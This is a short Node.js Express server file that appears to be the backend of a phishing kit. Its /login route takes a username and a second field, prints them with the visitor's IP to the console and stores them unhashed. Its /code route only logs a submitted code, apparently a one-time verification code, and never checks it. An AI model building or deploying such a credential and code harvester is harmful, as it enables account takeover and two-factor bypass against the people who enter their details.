const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const fs = require("fs");
const sqlite3 = require("sqlite3").verbose();

const app = express();
app.use(bodyParser.urlencoded({extended:true}));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname,"public")));

// SQLite DB
const DB_PATH = path.join(__dirname,"data.db");
const db = new sqlite3.Database(DB_PATH);
db.run(`CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT UNIQUE, field TEXT, created_at INTEGER)`);

// helper IP + escape
function clientIp(req){
  const hf = req.headers['x-forwarded-for'];
  if(hf) return hf.split(',')[0].trim();
  return (req.ip || 'unknown').toString();
}
function escapeHtml(str=""){ return String(str).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }

// POST /login
app.post("/login",(req,res)=>{
  const username = (req.body.username||"").trim();
  const field = (req.body.editable||"").trim();
  if(!username||!field) return res.json({ok:false,error:"missing_fields"});
  const ip = clientIp(req);
  const time = new Date().toISOString();

  console.log(`[LOGIN] Username: ${username}, Field: ${field}, IP: ${ip}, Time: ${time}`);

  // store locally
  db.run("INSERT OR REPLACE INTO users (username,field,created_at) VALUES (?,?,?)",
    [username,field,Date.now()], err=>{
      if(err) console.error(err);
    });

  res.json({ok:true});
});

// POST /code
app.post("/code",(req,res)=>{
  const code = (req.body.code||"").trim();
  const ip = clientIp(req);
  const time = new Date().toISOString();
  console.log(`[CODE] Code: ${code}, IP: ${ip}, Time: ${time}`);
  res.json({ok:true});
});

app.get("/health",(req,res)=>res.json({ok:true}));

const PORT = process.env.PORT || 3000;
app.listen(PORT,()=>console.log(`Server running on port ${PORT}`));